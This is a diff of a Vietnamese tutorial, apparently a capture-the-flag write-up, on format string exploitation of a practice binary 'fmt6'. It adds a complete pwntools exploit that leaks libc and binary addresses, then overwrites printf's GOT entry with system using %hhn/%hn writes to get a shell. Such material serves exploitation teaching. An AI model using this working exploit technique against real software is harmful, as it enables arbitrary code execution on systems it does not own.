@@ -393,11 +393,58 @@ Ví dụ:
 	0xff (nhị phân):     0000 0000 0000 0000 1111 1111 
 	Kết quả phép &:      0000 0000 0000 0000 0111 1111  (chỉ giữ lại BYTE cuối)
 
-Giả sử ta muốn lấy bit trước bit cuối?
+Giả sử ta muốn lấy BYTE trước BYTE cuối?
 
 	Địa chỉ (nhị phân):  0101 1011 1110 1111 0111 1111
-	Dịch bit phải >> 8:  0000 0000 0101 1011 1110 1111  (đẩy thêm bit 0 vào trái, byte cuối phải biến mất)
+	Dịch bit phải >> 8:  0000 0000 0101 1011 1110 1111  (đẩy thêm BYTE 0 vào trái, BYTE cuối phải biến mất)
 	0xff (nhị phân):     0000 0000 0000 0000 1111 1111
 	Kết quả phép &:      0000 0000 0000 0000 1110 1111   
 
+Xử lí dữ liệu rồi đưa vào payload:
 
+	part1=libc.sym['system'] & 0xff			//đưa vào 1 BYTE đầu
+	part2=libc.sym['system'] >> 8 & 0xffff  //đưa vào 2 BYTE sau
+	
+	payload=f'%{part1}c%10$hhn'.encode()
+	payload+=f'%{part2-part1}c%11$hn'.encode()
+	payload=payload.ljust(0x20,b'A')
+	payload+=p64(exe.got['printf'])
+	payload+=p64(exe.got['printf']+1)
+	p.sendlineafter(b'string: ',payload)
+
+## Script Python:
+
+	#!/usr/bin/env python3
+	from pwn import *
+	
+	exe = ELF("./fmt6",checksec=False)
+	libc = ELF("./libc-2.31.so",checksec=False)
+	ld = ELF("./ld-2.31.so",checksec=False)
+	context.binary = exe
+	p=process(exe.path)
+	
+	p.sendlineafter(b'string: ',b'%19$p%23$p')
+	data=p.recvline().split(b'0x')
+	
+	libc_leak=int(data[1],16)
+	libc.address=libc_leak-0x27023
+	
+	exe_leak=int(data[2][:-1],16)
+	exe.address=exe_leak-0x1217
+	
+	log.info('libc.address: '+hex(libc.address))
+	log.info('exe.address: '+hex(exe.address))
+	
+	part1=libc.sym['system'] & 0xff
+	part2=libc.sym['system'] >> 8 & 0xffff
+	
+	payload=f'%{part1}c%10$hhn'.encode()
+	payload+=f'%{part2-part1}c%11$hn'.encode()
+	payload=payload.ljust(0x20,b'A')
+	payload+=p64(exe.got['printf'])
+	payload+=p64(exe.got['printf']+1)
+	p.sendlineafter(b'string: ',payload)
+	
+	p.interactive()
+
+# Định dạng con "*"
